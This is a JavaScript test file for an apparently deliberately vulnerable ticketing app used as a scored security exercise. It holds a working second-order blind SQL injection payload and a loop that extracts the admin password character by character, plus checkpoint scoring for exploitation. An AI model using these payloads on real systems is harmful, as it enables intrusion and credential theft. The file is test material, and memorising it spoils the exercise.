const request = require('supertest')
const {
  newTestApp,
  registerAndLogin,
  registerUser,
  loginUser,
  loginAsPlatformAdmin,
  getPlatformAdminPassword,
  getScores,
} = require('./helpers')

async function createView(app, cookie, name, filter) {
  return request(app).post('/saved-views').set('Cookie', cookie).send({ name, filter })
}

async function runNow(app, cookie, id) {
  return request(app).post(`/saved-views/${id}/run-now`).set('Cookie', cookie)
}

describe('saved views (Path A: second-order blind SQL injection)', () => {
  test('/dashboard, /tickets, /saved-views require auth', async () => {
    const app = newTestApp()
    expect((await request(app).get('/tickets')).status).toBe(401)
    expect((await request(app).get('/saved-views')).status).toBe(401)
  })

  test('saving a view always succeeds, even with a syntactically broken filter', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const res = await createView(app, cookie, "broken", "status:'")
    expect(res.status).toBe(201)
  })

  test('running a broken-filter view returns 500, decoupled from the always-successful save', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const saveRes = await createView(app, cookie, 'broken', "status:'")
    const runRes = await runNow(app, cookie, saveRes.body.id)
    expect(runRes.status).toBe(500)
  })

  test('running a well-formed filter returns a matching_count', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const saveRes = await createView(app, cookie, 'my open', 'status:open')
    const runRes = await runNow(app, cookie, saveRes.body.id)
    expect(runRes.status).toBe(200)
    expect(typeof runRes.body.matching_count).toBe('number')
  })

  test('recon_saved_view_execution_decoupled fires only after a run-now 500', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    expect((await getScores(app)).reconnaissance).toBe(0)
    const saveRes = await createView(app, cookie, 'broken', "status:'")
    await runNow(app, cookie, saveRes.body.id)
    expect((await getScores(app)).reconnaissance).toBeCloseTo(1)
  })

  function oracleClause(pos, expectedChar) {
    return (
      `status:x'/**/OR/**/(SELECT/**/CASE/**/WHEN/**/SUBSTR(password,${pos},1)='${expectedChar}'` +
      `/**/THEN/**/'z'/**/ELSE/**/'q'/**/END/**/FROM/**/users/**/WHERE/**/email='admin@thornfield.internal')='z`
    )
  }

  test('a true-condition and a false-condition oracle clause produce different matching_count values', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const password = getPlatformAdminPassword(app)
    const correctFirstChar = password[0]
    const wrongChar = correctFirstChar === 'a' ? 'b' : 'a'

    const trueView = await createView(app, cookie, 'true', oracleClause(1, correctFirstChar))
    const falseView = await createView(app, cookie, 'false', oracleClause(1, wrongChar))

    const trueRes = await runNow(app, cookie, trueView.body.id)
    const falseRes = await runNow(app, cookie, falseView.body.id)

    expect(trueRes.status).toBe(200)
    expect(falseRes.status).toBe(200)
    expect(trueRes.body.matching_count).not.toBe(falseRes.body.matching_count)
  })

  test('vuln_detect_boolean_oracle_confirmed fires once two distinct oracle results are observed', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const password = getPlatformAdminPassword(app)
    const correctFirstChar = password[0]
    const wrongChar = correctFirstChar === 'a' ? 'b' : 'a'

    const trueView = await createView(app, cookie, 'true', oracleClause(1, correctFirstChar))
    const falseView = await createView(app, cookie, 'false', oracleClause(1, wrongChar))
    await runNow(app, cookie, trueView.body.id)
    expect((await getScores(app)).vulnerability_detection).toBe(0)
    await runNow(app, cookie, falseView.body.id)
    expect((await getScores(app)).vulnerability_detection).toBeCloseTo(2)
  })

  test('a full character-by-character extraction recovers the real admin password', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const realPassword = getPlatformAdminPassword(app)
    const alphabet = 'abcdefghijklmnopqrstuvwxyz'

    let recovered = ''
    for (let pos = 1; pos <= realPassword.length; pos++) {
      let found = null
      for (const ch of alphabet) {
        const view = await createView(app, cookie, `probe-${pos}-${ch}`, oracleClause(pos, ch))
        const runRes = await runNow(app, cookie, view.body.id)
        if (runRes.body.matching_count > 0) {
          found = ch
          break
        }
      }
      recovered += found
    }

    expect(recovered).toBe(realPassword)
  })

  test('exploit_admin_password_extracted_and_logged_in fires on any successful admin login', async () => {
    const app = newTestApp()
    expect((await getScores(app)).exploitation).toBe(0)
    await loginAsPlatformAdmin(app)
    expect((await getScores(app)).exploitation).toBeCloseTo(3)
  })

  test('a wrong password for the admin email does not fire the exploitation checkpoint', async () => {
    const app = newTestApp()
    await loginUser(app, 'admin@thornfield.internal', 'definitely-wrong')
    expect((await getScores(app)).exploitation).toBe(0)
  })

  test('exploit_workspace_settings_accessed_via_admin_login fires when the admin session reaches workspace-settings', async () => {
    const app = newTestApp()
    const cookie = await loginAsPlatformAdmin(app)
    const res = await request(app).get('/admin/workspace-settings').set('Cookie', cookie)
    expect(res.status).toBe(200)
    expect((await getScores(app)).exploitation).toBeCloseTo(4)
  })

  test('an ordinary member session cannot reach /admin/workspace-settings', async () => {
    const app = newTestApp()
    const cookie = await registerAndLogin(app, { workspaceName: 'Acme', email: 'a@acme.example' })
    const res = await request(app).get('/admin/workspace-settings').set('Cookie', cookie)
    expect(res.status).toBe(403)
  })
})
